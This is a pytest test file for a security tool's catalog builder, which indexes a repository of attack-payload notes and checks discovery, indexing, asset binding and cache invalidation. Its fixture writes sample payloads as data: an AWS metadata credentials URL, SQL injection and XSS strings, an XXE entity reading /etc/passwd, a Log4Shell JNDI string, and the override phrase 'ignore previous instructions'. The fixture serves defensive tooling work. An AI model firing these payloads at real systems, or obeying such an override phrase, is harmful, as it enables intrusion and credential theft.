from __future__ import annotations

from pathlib import Path

from pytest import MonkeyPatch

from app.services.pattt_catalog import build_pattt_catalog, validate_pattt_catalog


def _write_text(path: Path, content: str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(content.strip() + "\n", encoding="utf-8")


def _write_bytes(path: Path, content: bytes) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(content)


def _build_pattt_fixture(base_path: Path, monkeypatch: MonkeyPatch) -> Path:
    pattt_root = base_path / "knowledge" / "pattt"
    monkeypatch.setenv("AEGISSEC_PATTT_ROOT", str(pattt_root))
    repo_dir = pattt_root / "repo"
    _write_text(
        repo_dir / "Server Side Request Forgery" / "README.md",
        """
        # Server Side Request Forgery
        ## Detection
        - http://169.254.169.254/latest/meta-data/
        ## Bypass
        - metadata endpoint bypass example
        """,
    )
    _write_text(
        repo_dir / "Server Side Request Forgery" / "SSRF-Cloud-Instances.md",
        """
        # SSRF Cloud Instances
        ## AWS
        - http://169.254.169.254/latest/meta-data/iam/security-credentials/
        """,
    )
    _write_bytes(repo_dir / "Server Side Request Forgery" / "Intruder" / "ssrf.txt", b"payload")
    _write_text(
        repo_dir / "SQL Injection" / "README.md",
        """
        # SQL Injection
        ## Verification
        - ' OR '1'='1
        """,
    )
    _write_text(
        repo_dir / "SQL Injection" / "MySQL Injection.md",
        """
        # MySQL Injection
        ## Verification
        - UNION SELECT @@version
        """,
    )
    _write_text(
        repo_dir / "XSS Injection" / "README.md",
        """
        # XSS Injection
        ## Verification
        - <script>alert(1)</script>
        """,
    )
    _write_text(
        repo_dir / "XSS Injection" / "4 - CSP Bypass.md",
        """
        # CSP Bypass
        ## Bypass
        - strict-dynamic bypass
        """,
    )
    _write_bytes(repo_dir / "XSS Injection" / "Intruders" / "payloads.txt", b"payload")
    _write_bytes(repo_dir / "XSS Injection" / "Images" / "diagram.png", b"png")
    _write_text(
        repo_dir / "Prompt Injection" / "README.md",
        """
        # Prompt Injection
        ## Verification
        - ignore previous instructions
        """,
    )
    _write_text(
        repo_dir / "XXE Injection" / "README.md",
        """
        # XXE Injection
        ## Verification
        - <!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>
        """,
    )
    _write_bytes(repo_dir / "XXE Injection" / "Files" / "sample.xml", b"<xml />")
    _write_bytes(repo_dir / "XXE Injection" / "Intruders" / "xxe.txt", b"xxe")
    _write_text(
        repo_dir / "CVE Exploits" / "README.md",
        """
        # CVE Exploits
        ## Overview
        - curated exploit notes
        """,
    )
    _write_text(
        repo_dir / "CVE Exploits" / "Log4Shell.md",
        """
        # Log4Shell
        ## Verification
        - ${jndi:ldap://example.com/a}
        ## Exploit
        - reverse shell chain
        """,
    )
    _write_text(
        repo_dir / "Methodology and Resources" / "AWS Pentest.md",
        """
        # AWS Pentest
        ## Methodology
        - enumerate IAM and metadata paths
        """,
    )
    _write_text(
        repo_dir / "Methodology and Resources" / "Azure Pentest.md",
        """
        # Azure Pentest
        ## Methodology
        - enumerate IMDS endpoints
        """,
    )
    _write_text(repo_dir / ".source-commit", "fixture-sha\n")
    return pattt_root


def test_every_valid_top_level_dir_is_discovered(tmp_path: Path, monkeypatch: MonkeyPatch) -> None:
    pattt_root = _build_pattt_fixture(tmp_path, monkeypatch)
    result = build_pattt_catalog(
        repo_dir=pattt_root / "repo",
        catalog_dir=pattt_root / "catalog",
        repo_root=tmp_path,
        source_commit="fixture-sha",
    )

    family_ids = {entry["family_id"] for entry in result["families"]}
    assert "server-side-request-forgery" in family_ids
    assert "sql-injection" in family_ids
    assert "xss-injection" in family_ids
    assert "prompt-injection" in family_ids
    assert "cve-exploits" in family_ids
    assert any(family_id.startswith("methodology-and-resources__") for family_id in family_ids)


def test_every_markdown_file_is_indexed(tmp_path: Path, monkeypatch: MonkeyPatch) -> None:
    pattt_root = _build_pattt_fixture(tmp_path, monkeypatch)
    result = build_pattt_catalog(
        repo_dir=pattt_root / "repo",
        catalog_dir=pattt_root / "catalog",
        repo_root=tmp_path,
        source_commit="fixture-sha",
    )
    indexed_paths = {entry["path"] for entry in result["docs"]}
    live_paths = {
        path.relative_to(tmp_path).as_posix()
        for path in (pattt_root / "repo").rglob("*.md")
        if ".github" not in path.parts
    }
    assert indexed_paths == live_paths


def test_every_readme_is_marked_canonical(tmp_path: Path, monkeypatch: MonkeyPatch) -> None:
    pattt_root = _build_pattt_fixture(tmp_path, monkeypatch)
    result = build_pattt_catalog(
        repo_dir=pattt_root / "repo",
        catalog_dir=pattt_root / "catalog",
        repo_root=tmp_path,
        source_commit="fixture-sha",
    )
    readmes = [entry for entry in result["docs"] if entry["path"].endswith("/README.md")]
    assert readmes
    assert all(entry["kind"] == "canonical" for entry in readmes)


def test_methodology_flat_md_collection_is_supported(
    tmp_path: Path, monkeypatch: MonkeyPatch
) -> None:
    pattt_root = _build_pattt_fixture(tmp_path, monkeypatch)
    result = build_pattt_catalog(
        repo_dir=pattt_root / "repo",
        catalog_dir=pattt_root / "catalog",
        repo_root=tmp_path,
        source_commit="fixture-sha",
    )
    methodology_docs = [
        entry
        for entry in result["docs"]
        if entry["path"].startswith("knowledge/pattt/repo/Methodology and Resources/")
    ]
    assert methodology_docs
    assert all(entry["kind"] == "standalone_manual" for entry in methodology_docs)


def test_intruder_and_intruders_are_both_supported(
    tmp_path: Path, monkeypatch: MonkeyPatch
) -> None:
    pattt_root = _build_pattt_fixture(tmp_path, monkeypatch)
    result = build_pattt_catalog(
        repo_dir=pattt_root / "repo",
        catalog_dir=pattt_root / "catalog",
        repo_root=tmp_path,
        source_commit="fixture-sha",
    )
    asset_paths = {entry["path"] for entry in result["assets"]}
    assert any("/Intruder/" in path for path in asset_paths)
    assert any("/Intruders/" in path for path in asset_paths)


def test_assets_are_bound_to_family(tmp_path: Path, monkeypatch: MonkeyPatch) -> None:
    pattt_root = _build_pattt_fixture(tmp_path, monkeypatch)
    result = build_pattt_catalog(
        repo_dir=pattt_root / "repo",
        catalog_dir=pattt_root / "catalog",
        repo_root=tmp_path,
        source_commit="fixture-sha",
    )
    assets = result["assets"]
    assert any(entry["family_id"] == "xss-injection" for entry in assets)
    assert any(entry["family_id"] == "xxe-injection" for entry in assets)


def test_changed_file_invalidates_cache(tmp_path: Path, monkeypatch: MonkeyPatch) -> None:
    pattt_root = _build_pattt_fixture(tmp_path, monkeypatch)
    build_pattt_catalog(
        repo_dir=pattt_root / "repo",
        catalog_dir=pattt_root / "catalog",
        repo_root=tmp_path,
        source_commit="fixture-sha",
    )
    readme_path = pattt_root / "repo" / "Prompt Injection" / "README.md"
    readme_path.write_text(
        readme_path.read_text(encoding="utf-8") + "\n- changed\n", encoding="utf-8"
    )

    report = validate_pattt_catalog(
        repo_dir=pattt_root / "repo",
        catalog_dir=pattt_root / "catalog",
        repo_root=tmp_path,
    )

    assert report["ok"] is False
    assert any("fingerprint" in error.casefold() for error in report["errors"])
